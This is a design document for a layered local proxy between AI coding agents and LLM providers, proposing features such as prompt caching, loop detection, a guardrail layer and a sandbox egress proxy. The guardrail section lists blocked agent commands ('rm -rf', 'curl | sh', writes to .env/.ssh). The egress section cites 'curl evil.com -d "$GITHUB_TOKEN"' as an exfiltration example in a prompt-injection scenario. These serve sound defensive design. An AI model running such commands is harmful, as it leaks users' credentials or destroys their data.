# Extended Proxy Feature Research for `9router-proxy`

Catalog of AI coding agent and LLM gateway capabilities organized around the existing `9router-proxy` pipeline:

```text
Agent (IDE / CLI)
  -> :20131 orchestration_layer (role routing, roster injection, media adapter)
  -> :20130 context_layer       (tool/skill gating, lossless spill/compaction, token alerts, instructions)
  -> :20129 connection_layer    (forced rewrite, retries/fallbacks, 8s POST dedup, log redaction)
  -> :20128 9router
```

### Extend an Existing Layer vs. Create a New Proxy

- **Extend an existing layer (Section 1)** when the feature operates strictly on in-flight OpenAI Chat/Responses LLM payloads and reuses an existing layer's core state (`convId`, `sendSyntheticAssistantReply`, model fallback chains, `/orch` routing, or `proxy_logs`).
- **Build a new standalone proxy (Section 2)** when the feature introduces a distinct **protocol boundary** (Anthropic, Ollama, MCP, FIM), **security/trust boundary** (secret scrubbing before logs, egress sandbox isolation, prompt-injection firewall), **independent runtime/lifecycle** (concurrency queue, VCR test harness, OTLP exporter), or **non-LLM agent traffic**.

---

## Section 1 — Additional Features for Existing Proxies

### Tier 1 — Highest ROI (Low risk, immediate cost/reliability win)

#### 1. Prompt Cache Breakpoint & Prefix Stabilizer
*Inspired by: Claude Code (`cache_control: ephemeral`), OpenAI `prompt_cache_key`, Gemini Implicit/Explicit Caching, Cline/Roo Code*

- **Pipeline Placement:** End of `context_layer` (right after gating/compaction) or `connection_layer`.
- **Proxy Process:**
  1. Intercept outbound JSON request (`/v1/chat/completions`, `/v1/responses`, `/v1/messages`).
  2. Enforce deterministic ordering of static prefix: `tools` (sorted by name) -> `system` -> static project rules -> message history. Strip volatile fields (timestamps, request IDs, random whitespace) from prefix and move volatile metadata to tail user message.
  3. Inject provider-specific cache hints:
     - **Anthropic/Claude:** attach `cache_control: { type: "ephemeral" }` on last tool definition, system block, and `N-2` / `N-1` conversation turns (up to 4 breakpoints).
     - **OpenAI:** derive deterministic `prompt_cache_key` from `(convId + model)` so requests pin to the same cache shard.
  4. Track `cached_tokens / input_tokens` in PostgreSQL (`proxy_logs`) and alert when cache hit rate drops (prefix instability detector).
- **Pros:**
  - 50–90% input token cost reduction + lower TTFT on multi-turn coding sessions.
  - Complements existing `context_layer` suffix-append compaction.
- **Cons:**
  - Mid-session MCP tool gating changes or dynamic system instruction edits bust the prefix cache.
  - Anthropic charges a cache-write premium (1.25x–2x), which hurts 1-turn calls unless gated by min token/turn count.

---

#### 2. Doom-Loop / Thrashing Detector & Circuit Breaker
*Inspired by: OpenHands (`StuckDetector`), OpenCode (doom-loop guard), Cline (`consecutiveMistakeLimit`)*

- **Pipeline Placement:** `context_layer` (reuses `convId`, `sendSyntheticAssistantReply`, macOS confirmation dialog).
- **Proxy Process:**
  1. Maintain a per-`convId` sliding window of recent `(tool_name, canonical_args_hash, tool_error_flag)`.
  2. On each incoming request, scan recent `assistant` tool calls and `tool` results in `messages`/`input`:
     - **Repeat loop:** identical `(tool_name, args_hash)` >= 3x consecutively.
     - **Ping-pong cycle:** alternating `A -> B -> A -> B` >= 2 cycles.
     - **Error spiral:** >= 4 consecutive tool errors without file-edit progress.
  3. Trigger configurable action:
     - **Soft nudge:** inject tail reminder instructing the model to switch strategy or ask the user.
     - **Hard break:** short-circuit request via `sendSyntheticAssistantReply` to pause the loop, optionally prompting via macOS dialog.
- **Pros:**
  - Stops runaway token burn when agents get stuck on failing tests or broken diffs.
  - Zero latency overhead (pure local hash check); works uniformly across all IDEs/models.
- **Cons:**
  - False positives on valid iterative workflows (e.g., running tests repeatedly while editing files — must reset counters on successful edits).
  - Soft nudge slightly perturbs prompt tail.

---

### Tier 2 — Intelligence, Quality & Context Upgrades

#### 3. Malformed Tool-Call & Schema Auto-Repair
*Inspired by: OpenCode `invalid` tool repair, Cline parser fallback, Instructor / LiteLLM repair hooks*

- **Pipeline Placement:** `connection_layer` or `orchestration_layer` response pipeline.
- **Proxy Process:**
  1. Inspect upstream tool-calling responses for common weaker-model failures:
     - Tool call emitted as markdown/XML prose (`<tool_call>...</tool_call>`) instead of native `tool_calls`.
     - Broken JSON arguments (trailing commas, unescaped newlines, code fences).
     - Unknown tool name (fuzzy-match against request `tools`) or missing required schema fields.
  2. **Deterministic repair:** fix JSON syntax / convert XML blocks into valid OpenAI `tool_calls` structure and forward to client.
  3. **Internal retry fallback:** if unrepairable, silently append a synthetic `tool` error observation (`"Invalid args for X: missing field Y"`) and run 1 internal retry against upstream (or a fixer model) before returning a clean response to the IDE.
- **Pros:**
  - Makes cheaper/open-weight models (Qwen, DeepSeek, local models) reliable inside strict IDEs without crashing agent loops.
- **Cons:**
  - Requires buffering tool-call SSE chunks rather than pure streaming passthrough.
  - Internal retry adds one extra LLM round-trip on broken calls; client usage counters may undercount unless summed usage is returned.

---

#### 4. Dynamic Complexity & Reasoning-Effort Auto-Router
*Inspired by: RouteLLM (LMSYS), OpenRouter Auto, Cursor Auto, OpenAI `reasoning_effort`, Gemini `thinkingLevel`, Claude adaptive effort*

- **Pipeline Placement:** `orchestration_layer` (extends `router.js` beyond explicit `/orch-plan`).
- **Proxy Process:**
  1. For requests not pinned by `/orch-plan`, extract lightweight features from the latest user turn and session state (token count, code/diff presence, stack traces, intent keywords, turn depth).
  2. Classify complexity (`trivial` / `standard` / `hard`) via fast local heuristics or a tiny classifier (<30ms).
  3. Adjust:
     - **Model tier:** fast/cheap model for simple turns, frontier model for hard turns; and/or
     - **Reasoning effort:** scale `reasoning_effort` (`low`/`medium`/`high`), `thinkingConfig.thinkingLevel`, or Anthropic `thinking.budget_tokens` dynamically.
- **Pros:**
  - Cuts cost and latency automatically on routine lookups/edits without manual commands.
  - Scaling reasoning effort within the same model preserves provider prompt caches.
- **Cons:**
  - Switching models mid-conversation invalidates provider prompt cache (prefer effort-scaling mid-chat, model-switching on turn 1 or isolated sub-agents).
  - Misclassifying a subtle bug as trivial degrades answer quality.

---

#### 5. Semantic Rolling History Summarizer (LLM Auto-Compact)
*Inspired by: Claude Code `/compact` & auto-compact, Codex CLI `model_auto_compact_token_limit`, Cline/Roo Code context condensation*
*(Note: `context_layer` currently performs lossless tool-output spill/dedup, not semantic summarization of old dialogue turns.)*

- **Pipeline Placement:** `context_layer` (stage 2 fallback after lossless spill/dedup).
- **Proxy Process:**
  1. Watch `effectiveTokens / modelContextBudget`.
  2. Above threshold (e.g., >75%), preserve system prompt + pinned instructions + last `K` turns.
  3. Send older middle turns to a fast, cheap summarizer model with a structured schema (active goal, modified files, architectural decisions, open bugs, pending steps).
  4. Cache the summary keyed by `(convId, compactedUpToMsgHash)` in PG/memory so subsequent turns reuse the identical summary prefix (only 1 prompt-cache miss per compaction cycle).
- **Pros:**
  - Enables arbitrarily long IDE sessions without hitting context limits or suffering "lost in the middle" degradation.
  - Works even in IDEs without native compaction.
- **Cons:**
  - One-time prompt cache miss whenever compaction triggers.
  - Lossy: subtle early constraints can be dropped.
  - Adds a 2–5s pause on the compaction turn; IDE UI history diverges from the compacted history sent upstream.

---

#### 6. Speculative / Predicted Outputs Auto-Injector
*Inspired by: Cursor Fast Apply, OpenAI `prediction: { type: "content" }`*

- **Pipeline Placement:** `context_layer` or `connection_layer`.
- **Proxy Process:**
  1. Track recent `read_file` tool outputs per `convId` in memory (`filepath -> content`).
  2. When an edit-intent turn targets a recently read file on a compatible model (e.g. non-reasoning OpenAI models without conflicting parameters), attach `prediction: { type: "content", content: lastReadFileContent }`.
- **Pros:**
  - 2–4x faster token output on full-file rewrites via provider speculative decoding.
  - Transparent to the client IDE.
- **Cons:**
  - Narrow API support (OpenAI rejects `prediction` on reasoning models and certain tool/endpoint combinations).
  - Rejected draft tokens are still billed if the rewrite differs substantially from the original file.

---

### Tier 3 — Power-User Extensions

#### 7. Dual-Model Architect / Editor (or Critique / Verify) Middleware
*Inspired by: Aider Architect/Editor mode, Claude Code Stop-hook verification*

- **Pipeline Placement:** `orchestration_layer`.
- **Proxy Process:**
  1. Activated via slash command (`/verify`, `/arch-edit`) or dashboard toggle.
  2. **Architect/Editor mode:** forward prompt with tools stripped to a strong reasoning model to get a plain-text solution, then pipe that plan + original `tools` schema into a fast tool-calling Editor model and stream Editor's `tool_calls` back to the IDE.
  3. **Self-Critique mode:** buffer draft response, run a fast reviewer model against a strict checklist (hallucinated APIs, missing edge cases, broken diffs), and run one refinement pass if issues are flagged.
- **Pros:**
  - Lets strong reasoning models with poor tool-calling drive IDE tool loops cleanly.
  - Catches obvious bugs before the IDE applies broken edits.
- **Cons:**
  - Doubles latency and delays streaming during pass 1 (requires SSE `: keep-alive\n\n` heartbeats to avoid IDE timeouts).
  - Higher token spend per turn.

---

#### 8. Spend Budget Manager & Rate-Limit-Aware Routing
*Inspired by: LiteLLM Budget Manager, Helicone, Portkey, Cloudflare AI Gateway*

- **Pipeline Placement:** `connection_layer` + `storage_layer`.
- **Proxy Process:**
  1. Maintain rolling hourly/daily spend and token counters per `(project, model, provider)` using a pricing map in `storage_layer`.
  2. Enforce tiered caps:
     - **Soft cap:** auto-downgrade to a cheaper fallback model tier.
     - **Hard cap:** short-circuit with a synthetic assistant reply explaining which limit was hit.
  3. Parse upstream `429` and `x-ratelimit-remaining-*` headers to shift traffic proactively to alternate providers/fallbacks before hitting hard rate limits.
- **Pros:**
  - Prevents runaway API bills and reactive `429` retry stalls across all connected IDEs.
  - Integrates directly with existing Leon/Valiant dashboards and `proxy_logs`.
- **Cons:**
  - Pricing table requires periodic maintenance as provider rates change.
  - Proactive failover mid-session causes a one-time prompt-cache miss on the fallback provider.

---

## Section 2 — New Standalone Proxies

New proxy layers or sidecar services worth implementing as separate components outside the 3 core layers:

```text
                         [IDE / CLI / Claude Code / Ollama / Kiro]
                                     │
         ┌───────────────────────────┼───────────────────────────┐
         ▼ (LLM HTTP/SSE)            ▼ (MCP stdio/HTTP)          ▼ (FIM / Autocomplete)
  :20132 protocol_layer       :20140 mcp_gateway          :20142 fim_proxy -> local MLX/Ollama
         │                           │
         ▼                           └──▶ N local/remote MCP servers
  :20131 orchestration_layer
         │   ├─▶ [sidecar] memory_layer  (cross-session facts, glob rules, repo graph)
         │   └─▶ [optional] cache_layer  (stateless semantic/exact fast-path)
         ▼
  :20130 context_layer
         ▼
  :20133 guardrail_layer      (PII/secret vault, prompt-injection scan, tool-call firewall)
         ▼
  :20134 queue_layer          (concurrency limiter, RPM/TPM pacer, SSE keep-alive queue)
         ▼
  :20129 connection_layer ──┬─▶ [tap] telemetry_layer (OTLP spans -> Phoenix/Langfuse/Grafana)
                            └─▶ [tap/mode] replay_layer (VCR cassettes + async shadow evals)
         ▼
  :20128 9router

  [Sandboxed Agent Shell / Container] ──▶ :20141 egress_proxy (host/path allowlist + secret injection) ──▶ GitHub / npm / APIs
```

### 2A. Inline LLM Pipeline Proxies

#### P1. Protocol Translation & Client Bridge Proxy (`protocol_layer`)
*Inspired by: `1rgs/claude-code-proxy`, `musistudio/claude-code-router`, LiteLLM multi-protocol gateway, `QuantumNous/new-api`, existing `kiro_layer/route_responses.py`*

- **Topology:** Front-door ingress proxy (e.g. `:20132 -> :20131`).
- **Proxy Process:**
  1. Expose native client APIs on dedicated routes or ports:
     - Anthropic Messages (`POST /v1/messages`, `x-api-key` / `Authorization`) for Claude Code and Anthropic SDKs.
     - OpenAI Responses (`POST /v1/responses`) and legacy Chat Completions (`POST /v1/chat/completions`) bidirectional translation.
     - Ollama (`/api/chat`, `/api/generate`, `/api/tags`) and Gemini native (`:generateContent` / `:streamGenerateContent`) for clients locked to those schemas.
     - Consolidate client-specific MITM bridges (such as `kiro_layer/route_responses.py`) into one pluggable adapter registry.
  2. Translate inbound requests, tool schemas, and image blocks into canonical OpenAI format so `orchestration_layer`, `context_layer`, and `connection_layer` only maintain one internal representation.
  3. Stream-translate upstream SSE deltas back into the caller's exact event framing (including Anthropic `content_block_start`/`tool_use`/`thinking` deltas and usage payloads).
- **Pros:**
  - Lets every AI client (Claude Code, Kiro, Continue, local Ollama tools, Gemini SDKs) share one unified `9router-proxy` pipeline, dashboards, compaction, and orchestration.
  - Isolates brittle protocol quirks from the core layers.
- **Cons:**
  - Streaming tool-call and thinking-block translation has subtle edge cases across provider SDK versions.
  - Client-specific extensions (e.g. Anthropic server tools or prompt-cache headers) require careful pass-through mapping.

---

#### P2. Security, PII Vault & Tool-Call Guardrail Proxy (`guardrail_layer`)
*Inspired by: Claude Code `PreToolUse` hooks, Codex CLI `.rules` (`prefix_rule`), Cline/Roo Code command denylists, LiteLLM Presidio, Portkey Guardrails, Lakera / Llama Guard*

- **Topology:** Inline security boundary between `context_layer` and `connection_layer` (e.g. `:20133`, `:20130 -> :20133 -> :20129`).
- **Proxy Process:**
  1. **Outbound Secret & PII Vault:** scan outbound `messages`/`input` (especially `read_file` and shell tool outputs) using regex + Shannon entropy detectors for API keys, JWTs, `.env` values, private keys, and PII. Swap matches for deterministic session placeholders (`__SECRET_AWS_KEY_1__`) stored only in an ephemeral in-memory vault (never written to disk or PostgreSQL).
  2. **Indirect Prompt-Injection Scanner:** inspect untrusted tool outputs (`web_search`, `read_url`, external repo/issue payloads) for instruction-hijack patterns and either tag/quarantine suspicious spans or run a lightweight local classifier before forwarding upstream.
  3. **Inbound Stream Re-Hydration + Tool-Call Policy Firewall:**
     - Run a lookahead replacer over SSE/JSON chunks to restore vaulted placeholders before the IDE executes tools (optionally restricting restoration to `tool_calls` arguments only).
     - Buffer upstream `tool_calls` until argument JSON completes, then evaluate deterministic local policy rules (`rm -rf`, `git push --force`, `curl | sh`, writes outside repo root or targeting `.env`/`.ssh`):
       - `allow`: release untouched.
       - `deny` / `rewrite`: strip the call and return a synthetic assistant explanation, or rewrite flags safely (e.g. `--dry-run`).
       - `prompt`: trigger macOS confirmation dialog before releasing the tool call to the IDE.
  4. Write policy verdicts (never raw secrets) to a dedicated security audit table/dashboard.
- **Pros:**
  - Consolidates all trust/security controls into one auditable layer; scrubbing before `connection_layer` guarantees neither external providers nor local `proxy_logs` ever store raw secrets.
  - Enforces consistent safety policies across every IDE/CLI, even when client auto-approve is enabled.
- **Cons:**
  - Buffering `tool_calls` SSE deltas until argument JSON closes adds a brief pause on large file-write calls.
  - Streaming vault re-hydration requires careful prefix lookahead, and mangled placeholders from weak models can miss restoration.
  - Governs LLM payloads only — still complements rather than replaces OS sandboxing (see `P9`).

---

#### P3. Strict Concurrency Queue, Burst Smoother & Rate-Limit Pacer Proxy (`queue_layer`)
*Inspired by: vLLM / SGLang request scheduling, LiteLLM cooldowns, Portkey rate pacing*

- **Topology:** Inline traffic-shaping hop right before `connection_layer` or `9router` (e.g. `:20134`, `:20133 -> :20134 -> :20129`).
- **Proxy Process:**
  1. Maintain per-(provider, API key, model) concurrency semaphores and sliding-window RPM/TPM token buckets.
  2. When parallel sub-agent waves (e.g. `/orch-plan` launching 3–5 workers simultaneously) exceed provider limits, hold excess requests in an in-memory priority/FIFO queue instead of letting upstream return `429` and crash the IDE loop.
  3. For queued SSE requests, send immediate `200 OK` headers plus periodic `: keep-alive\n\n` comments (or hold pre-header within client TTFB budget) so IDE clients do not abort with socket timeouts.
  4. Automatically pause/pace queues using upstream `Retry-After` and `x-ratelimit-reset-*` headers and prioritize interactive foreground turns over background sub-agents or summaries.
- **Pros:**
  - Eliminates thundering-herd `429` failures during parallel sub-agent waves without changing IDE code.
  - Smooths bursty usage against tight subscription/free-tier quotas.
- **Cons:**
  - Sending `200 OK` early for SSE keep-alives prevents returning clean HTTP `4xx/5xx` status codes later if the queued request eventually fails (must surface errors as SSE error events or synthetic replies).
  - Queueing delays latency when concurrency caps are configured too conservatively.

---

#### P4. Semantic Cache & Local Fast-Path Proxy (`cache_layer`)
*Inspired by: GPTCache, LiteLLM Semantic Cache (Redis/Qdrant), Cloudflare AI Gateway, Helicone Caching*

- **Topology:** Optional fast-path proxy sitting ahead of `context_layer` (or invoked selectively for stateless calls, e.g. `:20135`).
- **Proxy Process:**
  1. Classify whether an inbound request is cache-eligible (stateless/non-tool turns such as PR/commit messages, chat titles, docs Q&A, code explanations, embeddings, or deterministic `temperature=0` prompts; bypass stateful agent tool loops).
  2. **L1 Exact Cache:** hash normalized `(model, system, messages)` and check local memory/SQLite/PG.
  3. **L2 Semantic Cache (optional):** embed latest user prompt via a fast local model (Ollama/ONNX) and query `pgvector`/SQLite for cosine similarity >= `0.96` scoped by `(project, model)`.
  4. On hit, synthesize an identical JSON or SSE response stream locally in <50ms with an `x-cache: HIT` header and zero upstream tokens.
- **Pros:**
  - Cuts repeated utility/helper calls and doc queries to near-zero latency and cost.
  - Keeps cache storage, embedding generation, and eviction policies completely decoupled from `context_layer`.
- **Cons:**
  - Low hit rate on multi-turn stateful coding loops (only valuable when cleanly scoped to stateless/helper calls).
  - False-positive semantic hits can return stale answers after code edits unless scoped by file hash/TTL.

---

#### P5. Record / Replay VCR, Shadow Mirror & Offline Eval Proxy (`replay_layer`)
*Inspired by: Hoverfly, WireMock, `mitmproxy` replay, TensorZero, Helicone Experiments, Bifrost*

- **Topology:** Dual-mode proxy — inline in `record`/`playback` mode for tests, or non-blocking async tap in `shadow` mode beside `connection_layer` (e.g. `:20136`).
- **Proxy Process:**
  1. **VCR Record / Playback Mode:** record full HTTP/SSE exchanges (including chunk timings and `tool_calls`) into canonical JSONL cassettes keyed by request fingerprint. In CI or local agent testing, replay cassettes deterministically with zero API cost and optional fault injection (`429`, truncated SSE, malformed tool JSON) to stress-test `connection_layer` and IDE loops.
  2. **Shadow-Traffic Mirror Mode:** on a configurable sample rate (e.g. 5%) or tagged turns (`/shadow`), forward the primary request normally with zero added latency while asynchronously mirroring the identical payload to one or more candidate models/prompts.
  3. **Offline Replay & Diff Scoring:** store `(primary_output, shadow_output, latency_delta, token_cost_delta, tool_schema_valid)` in PostgreSQL (`shadow_evals`) and provide a CLI to replay historical `proxy_logs` rows against new system instructions, compaction rules, or cheaper worker models.
- **Pros:**
  - Empirically benchmarks candidate `orchestration_layer` workers/fixers and `context_layer` compaction changes on real IDE traffic before rollout.
  - Makes integration tests for proxies and agent workflows fast, deterministic, and free.
- **Cons:**
  - Live shadow mirroring incurs extra API spend and consumes upstream rate limits.
  - Single-turn replay cannot capture full multi-turn trajectory divergence when a candidate model picks a different first tool call.

---

#### P6. Cross-Session Memory & Codebase Context Proxy (`memory_layer`)
*Inspired by: Mem0, Supermemory, Zep, Claude Code Auto-Memory (`MEMORY.md`), Windsurf Memories, Continue/Cursor `.rules` glob matching*

- **Topology:** Stateful context-enrichment proxy or sidecar service queried by `context_layer` / sitting inline before `:20130` (e.g. `:20137`).
- **Proxy Process:**
  1. Detect active project (`storage_layer/project.js`) and file paths referenced in the latest conversation turn.
  2. **Pre-Request Injection:**
     - Resolve glob-matched repository rule files (e.g. `*.gradle.kts`, `**/test/**`) and compact architectural summaries (e.g. `graphify-out` symbol graphs).
     - Query PostgreSQL (`tsvector` + optional `pgvector`) for top-K durable project/user memories.
     - Inject context using a prompt-cache-safe strategy (freeze durable memories at turn 1 or append volatile file rules near the turn tail).
  3. **Post-Response Async Extraction:** tap completed responses in the background and feed `(user_msg, assistant_msg)` to a small model to extract/update/invalidate durable preferences, build quirks, and architectural decisions in a `project_memories` table.
- **Pros:**
  - Delivers persistent cross-session memory, glob-scoped rules, and repo-map context uniformly across every IDE/CLI without bloating `context_layer`'s hot path.
  - Background extraction adds zero user-facing latency.
- **Cons:**
  - Stale or hallucinated memories silently degrade future turns unless paired with TTL/decay and a dashboard UI to inspect/prune entries.
  - Poorly placed injections can bust upstream prompt caches if prepended dynamically mid-session.

---

#### P7. Observability, OpenTelemetry (OTLP) & Cost Ledger Proxy (`telemetry_layer`)
*Inspired by: OpenLLMetry, Arize Phoenix, Langfuse, Helicone, Bifrost OTel plugin*

- **Topology:** Transparent passive tap or thin inline passthrough proxy (e.g. `:20138`, or sidecar log/stream consumer off `connection_layer`).
- **Proxy Process:**
  1. Observe every request/response lifecycle without mutating payloads (pure byte-identical passthrough with SSE tee).
  2. Assemble OpenTelemetry GenAI semantic convention spans (`gen_ai.system`, `gen_ai.request.model`, `gen_ai.usage.input_tokens`, `gen_ai.usage.cached_tokens`, TTFT, total latency, tool-call tree, linked by `convId` / `plan_id` / `task_key`).
  3. Export spans asynchronously via OTLP/HTTP to any backend (Arize Phoenix, Langfuse, Jaeger, Grafana Tempo) and correlate spend against active git repo, branch, and agent client.
- **Pros:**
  - Gives full distributed traces across multi-wave `/orch-plan` orchestrator -> worker -> fixer trees without instrumenting closed-source IDEs.
  - Plugs into standard observability stacks instead of re-implementing custom trace UIs from scratch.
- **Cons:**
  - Duplicates some metrics already stored in `proxy_logs` / `orch_calls` unless positioned as an export bridge.
  - Requires running an external OTLP collector/UI (Phoenix/Langfuse) to realize full visual value.

---

### 2B. Sidecar & Adjacent Agent Proxies (Non-LLM / Specialized Traffic)

#### P8. MCP Aggregator & Tool-Routing Gateway Proxy (`mcp_gateway`)
*Inspired by: MetaMCP, MCPHub, `sparfenyuk/mcp-proxy`, `punkpeye/mcp-proxy`, IBM MCP Context Forge, Higress MCP Gateway*

- **Topology:** Standalone local MCP gateway (e.g. `:20140`, Streamable HTTP / SSE / stdio bridge) sitting between all IDEs/CLIs and underlying MCP servers.
- **Proxy Process:**
  1. Spawn and manage N local `stdio` and remote SSE/HTTP MCP servers once as shared warm processes, exposing a single unified MCP endpoint to Android Studio, Claude Code, Codex, Kiro, and Cursor.
  2. Namespace tools (`github__create_issue`, `pg__query`) and expose per-project/per-client tool ACLs and read-only profiles.
  3. Support dynamic tool-group activation (`tools/list_changed`) paired with `context_layer` keyword gating so IDEs never pay schema token overhead for idle MCP servers.
  4. Enforce per-tool rate limits, result size truncation/spilling, and centralized MCP invocation audit logs in PostgreSQL.
- **Pros:**
  - Eliminates duplicating MCP configs and spawning redundant Node/Python MCP subprocesses per IDE window.
  - Cuts MCP schema bloat at the source while enforcing uniform tool permissions and logging across clients.
- **Cons:**
  - Single point of failure if the gateway crashes (requires supervisor/auto-restart per child MCP server).
  - Some IDEs do not yet handle dynamic `tools/list_changed` notifications cleanly without reconnecting.

---

#### P9. Agent Sandbox Egress & Credential-Injection Proxy (`egress_proxy`)
*Inspired by: Stripe Smokescreen, `mitmproxy` credential-swap addons, Envoy egress proxies, sandboxed coding-agent network proxies*

- **Topology:** Host-side outbound HTTP(S) proxy outside the agent's shell/container sandbox (e.g. `:20141`, configured via `HTTP_PROXY`/`HTTPS_PROXY` or base-URL overrides like `GITHUB_API_URL`).
- **Proxy Process:**
  1. Give the sandboxed coding agent **dummy placeholder credentials** (e.g. `GITHUB_TOKEN=dummy_sandbox_token`, dummy npm/Maven/Jira tokens) and restrict container egress so all outbound traffic must pass through the host proxy.
  2. Validate destination host, resolved IP (blocking private/loopback/metadata SSRF ranges), HTTP method, and URL path against an explicit allowlist; never follow redirects automatically.
  3. Swap the dummy credential header for the real host secret **only** when the request matches an approved `(host, path_prefix, method)` rule; reject everything else with `403` and log every outbound attempt.
- **Pros:**
  - Hard security boundary: even if prompt injection tricks an agent into running `env` or `curl evil.com -d "$GITHUB_TOKEN"`, the sandbox never holds real secrets and cannot exfiltrate them.
  - Complements `P2 guardrail_layer` (which guards LLM prompts/intents) with real network-level enforcement.
- **Cons:**
  - Tools that hardcode `https://` URLs and ignore base-URL env vars require TLS MITM (local CA installed in the sandbox).
  - Strict domain/path allowlists need periodic updates when projects add new package registries or APIs.

---

#### P10. FIM Autocomplete & Local-Model Offload Proxy (`fim_proxy`)
*Inspired by: Continue / Tabby / Ollama FIM proxies, Apple Silicon MLX / `llama.cpp` / vLLM local routers*

- **Topology:** Low-latency sidecar proxy for inline editor ghost-text / Fill-in-the-Middle traffic (e.g. `:20142 -> local MLX / llama.cpp / Ollama`, optional cloud fallback via `:20129`).
- **Proxy Process:**
  1. Accept high-frequency inline completion requests (`/v1/completions`, FIM prefix/suffix prompts) separately from heavy chat/agent turns so autocomplete traffic never clogs `orchestration_layer`, `context_layer`, or `proxy_logs`.
  2. Automatically abort/cancel superseded in-flight generations for the same editor cursor/file key whenever the developer keeps typing (saving local GPU cycles and cloud spend).
  3. Route short/routine completions to a fast local model (e.g. Qwen-Coder on MLX/`llama.cpp`) with a strict latency budget (e.g. 400ms TTFT) and optional fallback to a fast cloud model when local compute is busy or context is large.
- **Pros:**
  - Keeps inline autocomplete sub-second, private, and virtually free while isolating high-QPS noise from main agent logs and queues.
  - Request cancellation on keystroke dramatically improves responsiveness on local GPUs.
- **Cons:**
  - Requires a local inference runtime (MLX, `llama.cpp`, or Ollama) and sufficient unified RAM on the developer machine.
  - Only applicable to editors/plugins that allow configuring a custom autocomplete/FIM endpoint.

---

## Comparison Matrices

### Table 1 — Section 1: Additional Features for Existing Proxies

| # | Feature | Target Layer | Complexity | Prompt-Cache Impact | Primary Value |
| :--- | :--- | :--- | :--- | :--- | :--- |
| 1 | Prompt Cache Breakpoint & Prefix Stabilizer | `context` / `connection` | Low | Strong positive | 50–90% input cost & TTFT win |
| 2 | Doom-Loop / Thrashing Circuit Breaker | `context` | Low | Neutral | Stops stuck agent loops |
| 3 | Malformed Tool-Call Auto-Repair | `connection` / `orchestration` | Medium | Neutral | Makes cheap/OSS models reliable |
| 4 | Dynamic Complexity & Effort Auto-Router | `orchestration` | Medium | Positive (effort scaling) | Automatic cost/speed balance |
| 5 | Semantic Rolling History Summarizer | `context` | Medium | 1x miss on trigger | Endless sessions past context cap |
| 6 | Predicted Outputs Auto-Injector | `context` / `connection` | Low | Neutral | Faster file rewrites on supported APIs |
| 7 | Architect/Editor or Critique Loop | `orchestration` | High | Misses on extra pass | Higher accuracy / reasoning->tool bridge |
| 8 | Spend Caps & Rate-Limit-Aware Router | `connection` + `storage` | Low–Med | Neutral | Prevents `429` stalls & bill spikes |

### Table 2 — Section 2: New Standalone Proxies

| ID | Standalone Proxy | Topology | Suggested Port / Interface | Complexity | Primary Value |
| :--- | :--- | :--- | :--- | :--- | :--- |
| P1 | Protocol Translation & Client Bridge (`protocol_layer`) | Inline ingress | `:20132` (HTTP/SSE) | Medium–High | Unifies Claude Code, Ollama, Gemini, Kiro into one pipeline |
| P2 | Security, PII Vault & Tool-Call Guardrail (`guardrail_layer`) | Inline (`:20130 -> :20129`) | `:20133` (HTTP/SSE) | Medium–High | Single trust boundary: secret vault + injection scan + tool firewall |
| P3 | Strict Concurrency Queue & Burst Pacer (`queue_layer`) | Inline (`-> :20129`) | `:20134` (HTTP/SSE) | Medium | Eliminates parallel sub-agent `429` crashes via fair queueing |
| P4 | Semantic Cache & Local Fast-Path (`cache_layer`) | Inline / selective | `:20135` (HTTP/SSE) | Medium | Sub-50ms zero-cost hits on stateless utility & Q&A calls |
| P5 | VCR Record/Replay & Shadow Eval (`replay_layer`) | Inline (test) / async tap | `:20136` (HTTP/SSE + CLI) | Medium | Deterministic free CI tests + real-traffic model benchmarking |
| P6 | Cross-Session Memory & Codebase Context (`memory_layer`) | Inline / sidecar | `:20137` + PG | High | Persistent project facts, glob rules & repo graph across IDEs |
| P7 | OTLP Telemetry & Cost Ledger (`telemetry_layer`) | Passive tap / passthrough | `:20138` -> OTLP | Low–Med | Standard OpenTelemetry traces in Phoenix/Langfuse/Grafana |
| P8 | MCP Aggregator & Tool-Routing Gateway (`mcp_gateway`) | Sidecar (MCP) | `:20140` (Streamable HTTP/SSE) | Medium–High | 1 shared warm MCP hub with ACLs, logging & less schema bloat |
| P9 | Agent Sandbox Egress & Credential Proxy (`egress_proxy`) | Sidecar (egress) | `:20141` (`HTTP_PROXY`) | Medium | Zero real secrets inside agent sandbox; blocks exfiltration/SSRF |
| P10 | FIM Autocomplete & Local-Model Proxy (`fim_proxy`) | Sidecar (FIM) | `:20142` (HTTP) | Low–Med | Fast local inline completions isolated from chat/agent traffic |

---

## Recommended First Wave

- **Existing Layers (Section 1):** Start with **#1 (Prompt Cache Breakpoint)**, **#2 (Doom-Loop Breaker)**, and **#3 (Malformed Tool-Call Auto-Repair)**. All three reuse existing primitives (`convId`, `sendSyntheticAssistantReply`, macOS dialog, `proxy_logs`) with zero external dependencies.
- **New Standalone Proxies (Section 2):** Prioritize **P2 (`guardrail_layer`)** for immediate secret/safety protection before logs and upstream APIs, **P1 (`protocol_layer`)** if connecting non-OpenAI clients like Claude Code/Kiro/Ollama, and **P8 (`mcp_gateway`)** once running multiple IDEs against shared MCP servers.
